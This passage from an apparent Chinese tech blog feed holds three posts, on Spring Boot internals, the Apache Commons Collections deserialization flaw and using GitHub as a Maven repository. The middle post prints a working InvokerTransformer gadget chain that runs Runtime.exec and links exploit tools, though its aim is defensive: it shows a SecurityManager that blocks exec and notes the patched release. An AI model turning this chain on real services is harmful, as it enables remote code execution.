class="string">"jsp"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="spring-boot的web应用如何访问Resource"><a href="#spring-boot的web应用如何访问Resource" class="headerlink" title="spring boot的web应用如何访问Resource"></a>spring boot的web应用如何访问Resource</h3><p>当spring boot应用被打包为一个fat jar时，是如何访问到web resource的？</p>
<p>实际上是通过Archive提供的URL，然后通过Classloader提供的访问classpath resource的能力来实现的。</p>
<h4 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h4><p>比如需要配置一个index.html，这个可以直接放在代码里的src/main/resources/static目录下。</p>
<p>对于index.html欢迎页，spring boot在初始化时，就会创建一个ViewController来处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ResourceProperties</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceProperties</span> <span class="keyword">implements</span> <span class="title">ResourceLoaderAware</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] SERVLET_RESOURCE_LOCATIONS = &#123; <span class="string">"/"</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123;</span><br><span class="line">			<span class="string">"classpath:/META-INF/resources/"</span>, <span class="string">"classpath:/resources/"</span>,</span><br><span class="line">			<span class="string">"classpath:/static/"</span>, <span class="string">"classpath:/public/"</span> &#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//WebMvcAutoConfigurationAdapter</span></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">			Resource page = <span class="keyword">this</span>.resourceProperties.getWelcomePage();</span><br><span class="line">			<span class="keyword">if</span> (page != <span class="keyword">null</span>) &#123;</span><br><span class="line">				logger.info(<span class="string">"Adding welcome page: "</span> + page);</span><br><span class="line">				registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"forward:index.html"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>像页面模板文件可以放在src/main/resources/template目录下。但这个实际上是模板的实现类自己处理的。比如ThymeleafProperties类里的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_PREFIX = <span class="string">"classpath:/templates/"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><p>jsp页面和template类似。实际上是通过spring mvc内置的JstlView来处理的。</p>
<p>可以通过配置spring.view.prefix来设定jsp页面的目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.view.prefix: /WEB-INF/jsp/</span><br></pre></td></tr></table></figure>
<h3 id="spring-boot里统一的错误页面的处理"><a href="#spring-boot里统一的错误页面的处理" class="headerlink" title="spring boot里统一的错误页面的处理"></a>spring boot里统一的错误页面的处理</h3><p>对于错误页面，Spring boot也是通过创建一个BasicErrorController来统一处理的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicErrorController</span> <span class="keyword">extends</span> <span class="title">AbstractErrorController</span></span></span><br></pre></td></tr></table></figure>
<p>对应的View是一个简单的HTML提醒：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"server.error.whitelabel"</span>, name = <span class="string">"enabled"</span>, matchIfMissing = <span class="keyword">true</span>)</span><br><span class="line"><span class="meta">@Conditional</span>(ErrorTemplateMissingCondition<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">protected</span> <span class="title">static</span> <span class="title">class</span> <span class="title">WhitelabelErrorViewConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> SpelView defaultErrorView = <span class="keyword">new</span> SpelView(</span><br><span class="line">			<span class="string">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;"</span></span><br><span class="line">					+ <span class="string">"&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;"</span></span><br><span class="line">					+ <span class="string">"&lt;div id='created'&gt;$&#123;timestamp&#125;&lt;/div&gt;"</span></span><br><span class="line">					+ <span class="string">"&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;"</span></span><br><span class="line">					+ <span class="string">"&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Bean</span>(name = <span class="string">"error"</span>)</span><br><span class="line">	<span class="meta">@ConditionalOnMissingBean</span>(name = <span class="string">"error"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> View <span class="title">defaultErrorView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.defaultErrorView;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>spring boot的这个做法很好，避免了传统的web应用来出错时，默认抛出异常，容易泄密。</p>
<h3 id="spring-boot应用的maven打包过程"><a href="#spring-boot应用的maven打包过程" class="headerlink" title="spring boot应用的maven打包过程"></a>spring boot应用的maven打包过程</h3><p>先通过maven-shade-plugin生成一个包含依赖的jar，再通过spring-boot-maven-plugin插件把spring boot loader相关的类，还有MANIFEST.MF打包到jar里。</p>
<h3 id="spring-boot里有颜色日志的实现"><a href="#spring-boot里有颜色日志的实现" class="headerlink" title="spring boot里有颜色日志的实现"></a>spring boot里有颜色日志的实现</h3><p>当在shell里启动spring boot应用时，会发现它的logger输出是有颜色的，这个特性很有意思。</p>
<p>可以通过这个设置来关闭：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spring.output.ansi.enabled=false</span><br></pre></td></tr></table></figure>
<p>原理是通过AnsiOutputApplicationListener ，这个来获取这个配置，然后设置logback在输出时，加了一个 ColorConverter，通过org.springframework.boot.ansi.AnsiOutput ，对一些字段进行了渲染。</p>
<h2 id="一些代码小技巧"><a href="#一些代码小技巧" class="headerlink" title="一些代码小技巧"></a>一些代码小技巧</h2><h4 id="实现ClassLoader时，支持JDK7并行加载"><a href="#实现ClassLoader时，支持JDK7并行加载" class="headerlink" title="实现ClassLoader时，支持JDK7并行加载"></a>实现ClassLoader时，支持JDK7并行加载</h4><p>可以参考LaunchedURLClassLoader里的LockProvider</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LaunchedURLClassLoader</span> <span class="keyword">extends</span> <span class="title">URLClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> LockProvider LOCK_PROVIDER = setupLockProvider();</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> LockProvider <span class="title">setupLockProvider</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ClassLoader.registerAsParallelCapable();</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> Java7LockProvider();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (NoSuchMethodError ex) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> LockProvider();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">			<span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">		<span class="keyword">synchronized</span> (LaunchedURLClassLoader.LOCK_PROVIDER.getLock(<span class="keyword">this</span>, name)) &#123;</span><br><span class="line">			Class&lt;?&gt; loadedClass = findLoadedClass(name);</span><br><span class="line">			<span class="keyword">if</span> (loadedClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">				Handler.setUseFastConnectionExceptions(<span class="keyword">true</span>);</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					loadedClass = doLoadClass(name);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">finally</span> &#123;</span><br><span class="line">					Handler.setUseFastConnectionExceptions(<span class="keyword">false</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">				resolveClass(loadedClass);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> loadedClass;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h4 id="检测jar包是否通过agent加载的"><a href="#检测jar包是否通过agent加载的" class="headerlink" title="检测jar包是否通过agent加载的"></a>检测jar包是否通过agent加载的</h4><p>InputArgumentsJavaAgentDetector，原理是检测jar的URL是否有”-javaagent:”的前缀。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String JAVA_AGENT_PREFIX = <span class="string">"-javaagent:"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="获取进程的PID"><a href="#获取进程的PID" class="headerlink" title="获取进程的PID"></a>获取进程的PID</h4><p>ApplicationPid，可以获取PID。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getPid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		String jvmName = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">		<span class="keyword">return</span> jvmName.split(<span class="string">"@"</span>)[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="包装Logger类"><a href="#包装Logger类" class="headerlink" title="包装Logger类"></a>包装Logger类</h4><p>spring boot里自己包装了一套logger，支持java, log4j, log4j2, logback，以后有需要自己包装logger时，可以参考这个。</p>
<p>在org.springframework.boot.logging包下面。</p>
<h4 id="获取原始启动的main函数"><a href="#获取原始启动的main函数" class="headerlink" title="获取原始启动的main函数"></a>获取原始启动的main函数</h4><p>通过堆栈里获取的方式，判断main函数，找到原始启动的main函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Class&lt;?&gt; deduceMainApplicationClass() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        StackTraceElement[] stackTrace = <span class="keyword">new</span> RuntimeException().getStackTrace();</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTrace) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"main"</span>.equals(stackTraceElement.getMethodName())) &#123;</span><br><span class="line">                <span class="keyword">return</span> Class.forName(stackTraceElement.getClassName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// Swallow and continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="spirng-boot的一些缺点："><a href="#spirng-boot的一些缺点：" class="headerlink" title="spirng boot的一些缺点："></a>spirng boot的一些缺点：</h2><p>当spring boot应用以一个fat jar方式运行时，会遇到一些问题。以下是个人看法：</p>
<ul>
<li>日志不知道放哪，默认是输出到stdout的</li>
<li>数据目录不知道放哪, jenkinns的做法是放到 ${user.home}/.jenkins 下面</li>
<li>相对目录API不能使用，servletContext.getRealPath(“/“) 返回的是NULL</li>
<li>spring boot应用喜欢把配置都写到代码里，有时会带来混乱。一些简单可以用xml来表达的配置可能会变得难读，而且凌乱。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>spring boot通过扩展了jar协议，抽象出Archive概念，和配套的JarFile，JarUrlConnection，LaunchedURLClassLoader，从而实现了上层应用无感知的all in one的开发体验。尽管Executable war并不是spring提出的概念，但spring boot让它发扬光大。</p>
<p>spring boot是一个惊人的项目，可以说是spring的第二春，spring-cloud-config, spring-session, metrics, remote shell等都是深爱开发者喜爱的项目、特性。几乎可以肯定设计者是有丰富的一线开发经验，深知开发人员的痛点。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>ClassLoader</tag>
      </tags>
  </entry>
  <entry>
    <title>禁止JVM执行外部命令Runtime.exec -- 由Apache Commons Collections漏洞引发的思考</title>
    <url>/java-serialization-security/</url>
    <content><![CDATA[<p>update: 2015-11-16</p>
<h2 id="新版apache-commons-collections-3-2-2修复漏洞"><a href="#新版apache-commons-collections-3-2-2修复漏洞" class="headerlink" title="新版apache commons collections 3.2.2修复漏洞"></a>新版apache commons collections 3.2.2修复漏洞</h2><p>新版本的apache commons collections默认禁止了不安全的一些转换类。可以通过升级来修复漏洞。参考release说明：<a href="https://commons.apache.org/proper/commons-collections/release_3_2_2.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-collections/release_3_2_2.html</a></p>
<h2 id="Dubbo-rpc远程代码执行的例子"><a href="#Dubbo-rpc远程代码执行的例子" class="headerlink" title="Dubbo rpc远程代码执行的例子"></a>Dubbo rpc远程代码执行的例子</h2><p>update: 2015-11-13</p>
<p>重新思考了下这个漏洞，给出一个dubbo rpc远程代码执行的例子。</p>
<p><a href="https://github.com/hengyunabc/dubbo-apache-commons-collections-bug" target="_blank" rel="noopener">https://github.com/hengyunabc/dubbo-apache-commons-collections-bug</a></p>
<p><strong>可以说很多公司开放的rpc，只要协议里支持java序列化方式，classpath里有apache commons collections的jar包，都存在被远程代码执行的风险。</strong></p>
<p>至于能不能通过http接口再调用dubbo rpc远程代码，貌似不太可行。因为信息难以传递。</p>
<hr>
<h2 id="Apache-Commons-Collections远程代码执行漏洞"><a href="#Apache-Commons-Collections远程代码执行漏洞" class="headerlink" title="Apache Commons Collections远程代码执行漏洞"></a>Apache Commons Collections远程代码执行漏洞</h2><p>最近出来一个比较严重的漏洞，在使用了Apache Commons Collections的Java应用，可以远程代码执行。包括最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用。</p>
<p>这个漏洞的严重的地方在于，即使你的代码里没有使用到Apache Commons Collections里的类，只要Java应用的Classpath里有Apache Commons Collections的jar包，都可以远程代码执行。</p>
<p>参考：</p>
<ul>
<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></li>
<li><a href="http://blog.chaitin.com/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">http://blog.chaitin.com/2015-11-11_java_unserialize_rce/</a></li>
</ul>
<p>这个漏洞的演示很简单，只要在maven依赖里增加<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>再执行下面的java代码：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123; <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; "calc" &#125;) &#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">onlyElement.setValue(<span class="string">"foobar"</span>);</span><br></pre></td></tr></table></figure></p>
<p>这个漏洞的根本问题并不是Java序列化的问题，而是Apache Commons Collections允许链式的任意的类函数反射调用。攻击者通过允许Java序列化协议的端口，把攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。</p>
<p>这里不对这个漏洞多做展开，可以看上面的参考文章。</p>
<h2 id="如何简单的防止Java程序调用外部命令？"><a href="#如何简单的防止Java程序调用外部命令？" class="headerlink" title="如何简单的防止Java程序调用外部命令？"></a>如何简单的防止Java程序调用外部命令？</h2><p>从这个漏洞，引发了很久之前的一个念头：<strong>如何简单的防止Java程序调用外部命令？</strong></p>
<p>java相对来说安全性问题比较少。出现的一些问题大部分是利用反射，最终用Runtime.exec(String cmd)函数来执行外部命令的。<strong>如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。</strong></p>
<p>换而言之，就是如何禁止Java执行Runtime.exec(String cmd)之类的函数。</p>
<p>在Java里有一套Security Policy，但是实际上用的人比较少。因为配置起来太麻烦了。<br>参考：</p>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html</a></li>
<li><a href="http://docs.gigaspaces.com/xap102sec/java-security-policy-file.html" target="_blank" rel="noopener">http://docs.gigaspaces.com/xap102sec/java-security-policy-file.html</a> 详细的权限列表可以参考这个文档</li>
</ul>
<p>从文档里可以知道，Java里并没有直接禁止Rumtine.exec 函数执行的权限。</p>
<p>禁止文件执行的权限在java.io.FilePermission里。如果想禁止所有外部文件执行，可以在下面的配置文件中把<figure class="highlight plain"><figcaption><span>删除：</span></figcaption><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">grant &#123;</span><br><span class="line">  permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read, write, delete, execute&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>但是<strong>Java权限机制是白名单的</strong>，还有一大堆的权限要配置上去，非常复杂。<br>从tomcat的配置就知道了。<a href="http://tomcat.apache.org/tomcat-7.0-doc/security-manager-howto.html" target="_blank" rel="noopener">http://tomcat.apache.org/tomcat-7.0-doc/security-manager-howto.html</a><br>所以Tomcat默认是没有启用Security Policy的，可以通过在命令加上-security参数来启用。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">catalina.sh start -security</span><br></pre></td></tr></table></figure></p>
<p>那么有没有简单的办法可以在代码里禁止Java执行外部命令？</p>
<p>研究了下，通过扩展SecurityManager可以简单实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (originalSecurityManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 创建自己的SecurityManager</span></span><br><span class="line">    SecurityManager sm = <span class="keyword">new</span> SecurityManager() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 禁止exec</span></span><br><span class="line">            <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.io.FilePermission) &#123;</span><br><span class="line">                String actions = perm.getActions();</span><br><span class="line">                <span class="keyword">if</span> (actions != <span class="keyword">null</span> &amp;&amp; actions.contains(<span class="string">"execute"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"execute denied!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 禁止设置新的SecurityManager，保护自己</span></span><br><span class="line">            <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.lang.RuntimePermission) &#123;</span><br><span class="line">                String name = perm.getName();</span><br><span class="line">                <span class="keyword">if</span> (name != <span class="keyword">null</span> &amp;&amp; name.contains(<span class="string">"setSecurityManager"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"System.setSecurityManager denied!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">            check(perm);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm, Object context)</span> </span>&#123;</span><br><span class="line">            check(perm);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    System.setSecurityManager(sm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要在Java代码里简单加上面那一段，就可以禁止执行外部程序了。</p>
<h2 id="Java序列化的本身的蛋疼之处"><a href="#Java序列化的本身的蛋疼之处" class="headerlink" title="Java序列化的本身的蛋疼之处"></a>Java序列化的本身的蛋疼之处</h2><p>其实Java自身的序列化机制就比较蛋疼，可以参考Effective Java里的。<br><a href="http://allenlsy.com/NOTES-of-Effective-Java-10/" target="_blank" rel="noopener">http://allenlsy.com/NOTES-of-Effective-Java-10/</a></p>
<h2 id="并非禁止外部程序执行，Java程序就安全了"><a href="#并非禁止外部程序执行，Java程序就安全了" class="headerlink" title="并非禁止外部程序执行，Java程序就安全了"></a>并非禁止外部程序执行，Java程序就安全了</h2><p>要注意的是，如果可以任意执行Java代码，还可以做很多事情，比如写入ssh密钥，从而可以远程登陆，参考最近的Redis未授权访问漏洞：<a href="https://www.sebug.net/vuldb/ssvid-89715" target="_blank" rel="noopener">https://www.sebug.net/vuldb/ssvid-89715</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。但是以前没有见到有相关的内容，有点奇怪。<br>可以考虑在代码安全扫描时，加强对Runtime.exec相关代码的检测。<br>有些开源库喜欢用Runtime.exec来执行命令获取网卡mac等操作，个人表示相当的蛋疼，不会使用这样子的代码。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>security</tag>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>利用github搭建个人maven仓库</title>
    <url>/github-to-maven-repo/</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>之前看到有开源项目用了github来做maven仓库，寻思自己也做一个。研究了下，记录下。</p>
<p>简单来说，共有三步：</p>
<ol>
<li>deploy到本地目录</li>
<li>把本地目录提交到gtihub上</li>
<li>配置github地址为仓库地址</li>
</ol>
<h2 id="配置local-file-maven仓库"><a href="#配置local-file-maven仓库" class="headerlink" title="配置local file maven仓库"></a>配置local file maven仓库</h2><h3 id="deploy到本地"><a href="#deploy到本地" class="headerlink" title="deploy到本地"></a>deploy到本地</h3><p>maven可以通过http, ftp, ssh等deploy到远程服务器，也可以deploy到本地文件系统里。例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>hengyunabc-mvn-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>file:/home/hengyunabc/code/maven-repo/repository/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过命令行则是：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn deploy -DaltDeploymentRepository=hengyunabc-mvn-repo::default::file:/home/hengyunabc/code/maven-repo/repository/</span><br></pre></td></tr></table></figure></p>
<p><strong>推荐使用命令行来deploy，避免在项目里显式配置。</strong></p>
<p><a href="https://maven.apache.org/plugins/maven-deploy-plugin/" target="_blank" rel="noopener">https://maven.apache.org/plugins/maven-deploy-plugin/</a></p>
<p><a href="https://maven.apache.org/plugins/maven-deploy-plugin/deploy-file-mojo.html" target="_blank" rel="noopener">https://maven.apache.org/plugins/maven-deploy-plugin/deploy-file-mojo.html</a> </p>
<h2 id="把本地仓库提交到github上"><a href="#把本地仓库提交到github上" class="headerlink" title="把本地仓库提交到github上"></a>把本地仓库提交到github上</h2><p>上面把项目发布到本地目录home/hengyunabc/code/maven-repo/repository里，下面把这个目录提交到github上。</p>
<p>在Github上新建一个项目，然后把home/hengyunabc/code/maven-repo下的文件都提交到gtihub上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/hengyunabc/code/maven-repo/</span><br><span class="line">git init</span><br><span class="line">git add repository/*</span><br><span class="line">git commit -m <span class="string">'deploy xxx'</span></span><br><span class="line">git remote add origin git@github.com:hengyunabc/maven-repo.git</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<p>最终效果可以参考我的个人仓库：</p>
<p><a href="https://github.com/hengyunabc/maven-repo" target="_blank" rel="noopener">https://github.com/hengyunabc/maven-repo</a></p>
<h2 id="github-maven仓库的使用"><a href="#github-maven仓库的使用" class="headerlink" title="github maven仓库的使用"></a>github maven仓库的使用</h2><p>因为github使用了raw.githubusercontent.com这个域名用于raw文件下载。所以使用这个maven仓库，只要在pom.xml里增加：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>hengyunabc-maven-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://raw.githubusercontent.com/hengyunabc/maven-repo/master/repository<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="maven仓库工作的机制"><a href="#maven仓库工作的机制" class="headerlink" title="maven仓库工作的机制"></a>maven仓库工作的机制</h2><p>下面介绍一些maven仓库工作的原理。典型的一个maven依赖下会有这三个文件：</p>
<p><a href="https://github.com/hengyunabc/maven-repo/tree/master/repository/io/github/hengyunabc/mybatis-ehcache-spring/0.0.1-SNAPSHOT" target="_blank" rel="noopener">https://github.com/hengyunabc/maven-repo/tree/master/repository/io/github/hengyunabc/mybatis-ehcache-spring/0.0.1-SNAPSHOT</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">maven-metadata.xml</span><br><span class="line">maven-metadata.xml.md5</span><br><span class="line">maven-metadata.xml.sha1</span><br></pre></td></tr></table></figure></p>
<p>maven-metadata.xml里面记录了最后deploy的版本和时间。</p>
